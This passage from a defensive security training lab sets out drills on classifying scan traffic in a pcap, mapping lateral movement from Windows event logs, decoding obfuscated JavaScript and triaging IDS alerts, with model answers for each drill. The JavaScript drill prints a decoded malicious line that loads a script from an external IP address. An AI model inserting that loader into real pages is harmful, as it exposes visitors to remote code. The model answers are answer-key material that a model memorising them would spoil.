## 4. Drill-D10 - Recognise reconnaissance from scan patterns

**25 minutes. Runs in the container. Data: 2025 traffic pcap.**

**Objective.** Separate reconnaissance from exploitation, and prove which the evidence shows.

**Run this.**

```bash
tshark -r /labs/artifacts/2025-01-22-traffic-analysis-exercise.pcap -Y 'http.response.code == 404' -T fields -e ip.src | sort | uniq -c | sort -rn | head
tshark -r /labs/artifacts/2025-01-22-traffic-analysis-exercise.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.src | sort | uniq -c | sort -rn | head -4
```

**What good looks like.**

```text
584 5.252.153.241

    419 10.1.17.215

584 requests failed from one address, and every inbound SYN in the capture comes from the victim
itself. There is no port scan here at all: the reconnaissance is web enumeration counted by failure.
The discipline is to check which form of scanning the evidence supports before writing the words
port scan into a report.
```

**Save this evidence:** `scan classification` in `/labs/reports/`.

**Pass criterion.** Explains why the SYN count is not a scan, and finds the 404 burst.

**Common mistake.** Reporting a port scan the capture does not contain.

## 5. Drill-D11 - Trace internal spread and privilege escalation

**35 minutes. Runs on kali. Data: evtx Lateral Movement and Privilege Escalation.**

**Objective.** Trace internal spread and privilege escalation through host telemetry.

**Run this.**

```bash
grep -i 'lateral\|psexec\|wmiexec' /labs/artifacts/evtx-attack-samples/README.md | head
ls /labs/artifacts/evtx-attack-samples/'Lateral Movement' | head
ls /labs/artifacts/evtx-attack-samples/'Privilege Escalation' | head
```

**What good looks like.**

```text
A spread map: source host, target host, method, account, timestamp, and the event id
that proves it. One row must show the privilege change that enabled the move.
```

**Save this evidence:** `host spread map` in `/labs/reports/`.

**Pass criterion.** Every move cites an event id and the account used.

**Common mistake.** Assuming lateral movement from a single logon type 3 event.

## 6. Drill-D12 - Decode obfuscated JavaScript

**30 minutes. Runs on kali. Data: authored HTML sample.**

**Objective.** Decode obfuscated JavaScript and decide whether it is malicious.

**Run this.**

```bash
grep -o '"[A-Za-z0-9+/=]\{20,\}"' /labs/work/samples/obfuscated.html | tr -d '"' | head -1 | base64 -d
grep -oE 'eval|atob|fromCharCode' /labs/work/samples/obfuscated.html | sort | uniq -c
```

**What good looks like.**

```text
document.write('<script src="http://45.125.66.32:2917/a.js"></script>')

Two obfuscation stages: hex escaped strings, then atob, then eval. The verdict is external script
load from the same host as the beacon, and the learner must say what the browser would fetch, not
that the file looks obfuscated.
```

**Save this evidence:** `deobfuscated script, verdict` in `/labs/reports/`.

**Pass criterion.** The decode is shown, and the verdict names effect, not intent.

**Common mistake.** Running the sample in a browser to see what it does.

## 7. Drill-D13 - Triage three IDS alerts

**25 minutes. Runs on kali. Data: authored alert excerpts.**

**Objective.** Triage three IDS alerts and justify each as true or false positive.

**Run this.**

```bash
cat /labs/work/alerts/three-alerts.txt
```

**What good looks like.**

```text
Alert 1 is a mislabelled true positive: the signature says external IP lookup, the
traffic is the incident channel. Alert 2 is benign browser update. Alert 3 is a false positive from
the internal scanner and needs its source address excluded from the signature. One of three is
genuinely benign, which is the distinction the drill is testing.
```

**Save this evidence:** `true or false table with reasons` in `/labs/reports/`.

**Pass criterion.** Each verdict cites the traffic or log that settles it.

**Common mistake.** Clearing an alert because it is noisy, without checking that instance.

## Handover brief

Two minutes at the end. Each learner answers three questions out loud, in 90 seconds:

1. **Finding.** One sentence a client would understand. No tool names.
2. **Limitation.** What this evidence cannot tell you, and why.
3. **Next step.** The single next action you would take, and who authorises it.

Record the three answers in `/labs/reports/` as the lab's closing note. This is group A4, record keeping, in practice.
